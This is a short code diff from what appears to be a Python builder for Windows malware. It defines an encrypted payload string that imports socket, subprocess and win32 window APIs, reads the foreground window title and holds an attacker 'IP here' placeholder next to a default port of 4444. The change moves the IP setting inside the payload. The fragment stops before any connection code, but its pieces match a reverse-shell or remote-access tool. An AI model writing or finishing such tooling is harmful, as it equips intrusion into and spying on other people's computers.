@@ -1,9 +1,11 @@
 from cryptography.fernet import Fernet
 from os import system
-IP = "0.0.0.0" # Put IP here
-#Port = "4444" Might mess stuff up
+
+
 payload = b'''
 import os,sys,socket,subprocess,threading,win32gui,win32con,win32event,win32api,winerror
+
+IP = "0.0.0.0" # Put IP here
 
 frgrnd_wndw = win32gui.GetForegroundWindow();
 wndw_title  = win32gui.GetWindowText(frgrnd_wndw);
